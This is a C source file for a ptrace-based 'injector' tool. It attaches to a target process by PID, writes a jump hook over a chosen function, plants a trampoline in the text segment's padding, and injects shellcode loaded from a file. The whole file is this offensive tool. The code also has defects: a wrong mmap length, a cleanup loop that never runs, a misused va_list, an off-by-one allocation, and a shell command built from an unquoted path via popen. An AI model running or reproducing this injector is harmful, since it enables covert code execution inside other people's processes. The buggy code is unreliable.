#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <stdarg.h>
#include <sys/user.h>

#define PERM_READ   1
#define PERM_WRITE  2
#define PERM_EXEC   4
#define PERM_SHARED 8
#define PERM_PRIVATE 16

struct mem_region {
    char *mapped_file;
    unsigned long base_address;
    unsigned long end_address;
    size_t region_sz;
    int perms;
};

struct process_image {
    struct mem_region *regions;
    size_t regions_num;
};

static void *open_and_mmap(const char *pathname, int prot, int flags, size_t *len);
static int parse_proc_maps(const char *line, struct mem_region *buf);
static struct process_image *get_memory_regions(int pid);
static unsigned long get_exec_section_padding_start(const char *file);

size_t c_fmtlen(const char *format, ...);
size_t c_vsprintf_alloc(char **buf, const char *format, va_list ap);
size_t c_sprintf_alloc(char **buf, const char *format, ...);
size_t c_vfmtlen(const char *format, va_list ap);

static void *open_and_mmap(const char *pathname, int prot, int flags, size_t *len)
{
    int fd;
    void *mmap_address = NULL;
    struct stat st;

    fd = open(pathname, O_RDWR);
    if (fd == -1)
        return NULL;

    if (fstat(fd, &st) == -1)
        return NULL;

    mmap_address = mmap(0, st.st_size, prot, flags, fd, 0);
    if (mmap_address == MAP_FAILED)
            return NULL;

    close(fd);

    *len = st.st_size;

    return mmap_address;
}
static int parse_proc_maps(const char *line, struct mem_region *buf)
{
    char *end_addr = NULL;
    char *perms = NULL;
    const char *mapped_file = NULL;

    buf->base_address = strtoul(line, &end_addr, 16);
    buf->end_address = strtoul(end_addr+1, &perms, 16);

    buf->region_sz = buf->end_address - buf->base_address;

    buf->perms = 0;
    perms++;
    while (*perms != ' ') {
        switch (*perms++) {
            case 'r':
                buf->perms |= PERM_READ;
                break;
            case 'w':
                buf->perms |= PERM_WRITE;
                break;
            case 'x':
                buf->perms |= PERM_EXEC;
                break;
            case 's':
                buf->perms |= PERM_SHARED;
                break;
            case 'p':
                buf->perms |= PERM_PRIVATE;
                break;
            default:
                break;
        }
    }

    mapped_file = &line[strlen(line)-1];
    if (isdigit(*mapped_file)) {  // anonymous mapping
        buf->mapped_file = NULL;
    } else {
        while (*mapped_file != ' ')
            mapped_file--;
        buf->mapped_file = strndup(mapped_file+1, strlen(mapped_file+1) - 1);
    }

    return 0;
}

static struct process_image *get_memory_regions(int pid)
{
    struct process_image *process = malloc(sizeof(*process));
    char filename[20];
    FILE *maps_file = NULL;
    char *line = NULL;
    size_t line_len = 0;
    int lines = 0;
    void *temp_buf = NULL;

    snprintf(filename, 20, "/proc/%d/maps", pid);

    maps_file = fopen(filename, "r");
    if (!maps_file)
        return NULL;

    process->regions = NULL;

    while (getline(&line, &line_len, maps_file) != -1) {
        lines++;
        temp_buf = reallocarray(process->regions, lines, sizeof(*process->regions));
        if (!temp_buf)
            break;

        process->regions = temp_buf;
        parse_proc_maps(line, process->regions+(lines-1));
    }

    process->regions_num = lines;
    free(line);

    return process;
}

static unsigned long get_exec_section_padding_start(const char *file)
{
    char *command_str = NULL;
    FILE *command = NULL;
    unsigned long padding_start = 0;
    char *line = NULL;
    size_t line_len = 0;

    c_sprintf_alloc(&command_str, "readelf -e %s | grep LOAD -A1 | grep -e E | awk '{print $1}'", file);

    command = popen(command_str, "r");

    getline(&line, &line_len, command);
    padding_start = strtoul(line, NULL, 16);

    pclose(command);
    free(line);
    free(command_str);

    return padding_start;
}

int main(int argc, char *argv[])
{
    const char *shellcode = NULL;
    int shellcode_file_fd = 0;
    struct stat st;
    unsigned char *shellcode_mmaped = NULL;
    size_t shellcode_mmaped_sz = 0;
    struct user_regs_struct regs;
    unsigned long address_to_hook, padding_start;
    int target_pid;
    void *object_file_mmap = NULL;
    struct process_image *process = NULL;
    struct mem_region *text_segment = NULL;
    size_t mapping_len = 0;
    unsigned long original_bytes;
    unsigned char add_rsp_8[4] = "\x48\x83\xc4\x08";    // add  rsp, 0x8
    unsigned char jmpn_function[5] = "\xe9\xfc\xff\xff\xff";  //	jmp near function_address
    unsigned long hook_address;
    int hook_address_jmpto;
    int trampoline_jmp_address;

    unsigned char hook_asm[8] = "\xe9\x00\x00\x00\x00\x90\x90\x90";


    if (argc < 4) {
        fprintf(stderr, "usage: ./injector shellcode address_to_hook target_pid\n");
        exit(0);
    }

    shellcode = argv[1];
    address_to_hook = strtoul(argv[2], NULL, 16);
    target_pid = atoi(argv[3]);
    (void) address_to_hook;

    printf("attaching to target %d\n", target_pid);

    if (ptrace(PTRACE_ATTACH, target_pid, 0, 0) < 0) {
        perror("ptrace");
        exit(1);
    }

    if (waitpid(target_pid, NULL, 0) < 0) {
        perror("waitpid");
        exit(1);
    }

    printf("getting process registers\n");
    ptrace(PTRACE_GETREGS, target_pid, NULL, &regs);

    printf("preparing shellcode...\n");
    object_file_mmap = open_and_mmap(shellcode, PROT_READ|PROT_WRITE, MAP_PRIVATE, &mapping_len);
    if (!object_file_mmap) {
        fprintf(stderr, "error opening \"%s\"\n", shellcode);
        exit(1);
    }

    printf("checking for the text segment\n");
    process = get_memory_regions(target_pid);
    if (!process) {
        fprintf(stderr, "failed to open /proc/%d/maps :(\n", target_pid);
        exit(1);
    }

    for (size_t i = 0; i < process->regions_num; i++) {
        if (process->regions[i].perms & PERM_EXEC) {
            text_segment = &process->regions[i];
            break;
        }
    }

    printf("found text segment at address 0x%lx with size 0x%lx\n", text_segment->base_address, text_segment->region_sz);
    padding_start = get_exec_section_padding_start(text_segment->mapped_file) + text_segment->base_address;
    printf("padding start at address 0x%lx\n", padding_start);
    hook_address = (padding_start+17) - (address_to_hook+5);

    original_bytes = ptrace(PTRACE_PEEKTEXT, target_pid, address_to_hook, NULL);
    for (size_t i = 1; i < 1+sizeof(int); i++)
        hook_asm[i] = (unsigned char)(hook_address >> (i-1)*8);
    hook_asm[7] = (unsigned char)(original_bytes >> 7 * 8);
    printf("writing hook to function...");
    for (size_t i = 0; i < 8; i++)
        printf(" 0x%02x", (unsigned char)hook_asm[i]);
    printf("\n");
    ptrace(PTRACE_POKETEXT, target_pid, address_to_hook, *(unsigned long *)hook_asm);

    trampoline_jmp_address = (address_to_hook+7) - (padding_start+17);
    *(int *)(jmpn_function+1) = trampoline_jmp_address;
    printf("writing trampoline...");

    ptrace(PTRACE_POKETEXT, target_pid, padding_start, *(unsigned long *)add_rsp_8);
    ptrace(PTRACE_POKETEXT, target_pid, padding_start+4, original_bytes);
    ptrace(PTRACE_POKETEXT, target_pid, padding_start+4+sizeof(original_bytes), *(unsigned long *)jmpn_function);

    printf("writing shellcode...\n");
    shellcode_file_fd = open(shellcode, O_RDWR);
    fstat(shellcode_file_fd, &st);
    shellcode_mmaped_sz = st.st_size;
    shellcode_mmaped = mmap(0, shellcode_file_fd, PROT_READ | PROT_WRITE, MAP_PRIVATE, shellcode_file_fd, 0);

    hook_address_jmpto = padding_start - (padding_start+4+sizeof(original_bytes)+5+shellcode_mmaped_sz);

    *(int*)(shellcode_mmaped+(shellcode_mmaped_sz-4)) = hook_address_jmpto;
    for (size_t i = 0; i < shellcode_mmaped_sz; i++) {
        printf(" 0x%02x", (unsigned char )shellcode_mmaped[i]);
        if (i > 0 && i % 8 == 0)
            printf("\n");
    }
    printf("\n");

    for (size_t i = 0; i < shellcode_mmaped_sz; i+=sizeof(unsigned long))
        ptrace(PTRACE_POKETEXT, target_pid, padding_start+4+sizeof(original_bytes)+5+i, *(unsigned long *)(shellcode_mmaped+i));

    close(shellcode_file_fd);
    munmap(shellcode_mmaped, shellcode_mmaped_sz);

    for (size_t i = 0; i > process->regions_num; i++)
        free(process->regions[i].mapped_file);
    free(process->regions);
    free(process);

    printf("detaching from target\n");
    if (ptrace(PTRACE_DETACH, target_pid, 0, 0) < 0) {
        perror("ptrace");
        exit(1);
    }

    printf("** It worked!! :)\n...or maybe not ¯\\_(ツ)_/¯\n");
    munmap(object_file_mmap, mapping_len);
}

size_t c_fmtlen(const char *format, ...)
{
    va_list ap;
    size_t len;

    va_start(ap, format);
    len = c_vfmtlen(format, ap);
    va_end(ap);

    return len;
}

size_t c_vfmtlen(const char *format, va_list ap)
{
    va_list ap_copy;
    char dummy_buffer[1];
    size_t len;

    if (!format)
        return 0;

    va_copy(ap_copy, ap);
    // vsnprintf() returns the number that would have been written
    len = vsnprintf(dummy_buffer, 1, format, ap_copy);
    va_end(ap);

    return len;
}

/*
 * calls c_vsprintf_alloc() internally.
 */
size_t c_sprintf_alloc(char **buf, const char *format, ...)
{
    va_list ap;
    size_t written;

    va_start(ap, format);
    written = c_vsprintf_alloc(buf, format, ap);
    va_end(ap);

    return written;
}

/*
 * Sames as vsprintf, but it allocates a buffer using c_malloc().
 * The caller should free() the buffer when done using it.
 *
 * The c_malloc() function aborts in case of ENOMEM.
 */
size_t c_vsprintf_alloc(char **buf, const char *format, va_list ap)
{
    *buf = malloc(c_vfmtlen(format, ap));
    return vsprintf(*buf, format, ap);
}
